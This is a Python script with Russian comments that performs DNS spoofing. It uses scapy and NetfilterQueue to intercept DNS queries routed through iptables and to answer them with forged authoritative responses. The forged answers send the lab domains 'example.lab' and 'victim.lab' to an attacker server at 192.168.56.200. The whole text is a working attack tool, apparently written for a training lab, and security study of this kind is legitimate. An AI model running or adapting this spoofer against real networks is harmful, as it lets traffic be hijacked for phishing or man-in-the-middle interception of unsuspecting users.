"""
Запуск: sudo python3 dns_spoof.py
Перед запуском настроить iptables.
"""
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
from netfilterqueue import NetfilterQueue

# Словарь подмены: домен -> поддельный IP (наш атакующий сервер)
SPOOF_MAP = {
    b"example.lab.": "192.168.56.200",
    b"victim.lab.":  "192.168.56.200",
}

def process_packet(packet):
    """Обработка перехваченного пакета."""
    scapy_pkt = IP(packet.get_payload())

    # Нас интересуют только DNS-ответы/запросы с QR=0 (запрос)
    if scapy_pkt.haslayer(DNS) and scapy_pkt[DNS].qr == 0:
        qname = scapy_pkt[DNSQR].qname.lower()
        print(f"[*] Перехвачен DNS-запрос: {qname.decode(errors='ignore')}")

        if qname in SPOOF_MAP:
            spoofed_ip = SPOOF_MAP[qname]
            print(f"[+] Подмена: {qname.decode()} -> {spoofed_ip}")

            # Формируем поддельный DNS-ответ
            dns_response = (
                IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src)
                / UDP(sport=scapy_pkt[UDP].dport, dport=scapy_pkt[UDP].sport)
                / DNS(
                    id=scapy_pkt[DNS].id,
                    qr=1,                # ответ
                    aa=1,                # authoritative
                    qd=scapy_pkt[DNS].qd,  # вопрос копируем
                    an=DNSRR(rrname=qname, ttl=10, rdata=spoofed_ip)
                )
            )
            packet.set_payload(bytes(dns_response))
            packet.accept()
            return

    packet.accept()

if __name__ == "__main__":
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, process_packet)

    print("[*] DNS-спуфинг запущен. Ctrl+C для остановки.")
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[*] Остановка...")
        nfqueue.unbind()